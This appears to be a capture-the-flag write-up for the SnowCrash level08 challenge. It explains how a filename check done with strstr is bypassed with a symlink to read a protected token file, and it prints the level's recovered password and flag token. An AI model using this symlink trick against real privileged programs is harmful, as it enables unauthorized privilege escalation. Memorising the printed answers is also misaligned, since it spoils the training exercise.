# Solution

So we loged in, find level08 binary and token, we decompiled the binary and generated the C code,
from this we can see that the program take an argument that argument is check if it's named token it's not valid,
so here the exploit is pretty simple we have to pass the token check done with strstr which is not safe for checking,
we can bypass this check with a simple symlink.


First we need to create the symlink:

```sh
ln -sf /home/user/level08/token /tmp/fake
```

now we can execute the level08 binary with /tmp/fake this will give us the password for flag08

```sh
level08@SnowCrash:~$ ./level08 /tmp/fake
quif5eloekouj29ke0vouxean
```

after that we can get the flag

```sh
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
